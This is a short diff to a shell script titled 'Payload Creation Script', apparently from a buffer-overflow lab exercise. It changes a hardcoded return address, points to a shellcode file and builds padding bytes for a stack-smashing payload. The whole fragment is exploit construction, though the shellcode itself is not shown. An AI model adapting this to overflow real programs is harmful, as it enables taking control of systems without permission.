@@ -1,7 +1,7 @@
 ## Payload Creation Script
 
 # change return address
-ret_addr=0x7efff1b0
+ret_addr=0x7efffc60
 shellcode="res/shellcode.txt"
 
 pad=$(for i in $(seq 40); do echo -n '42'; done)
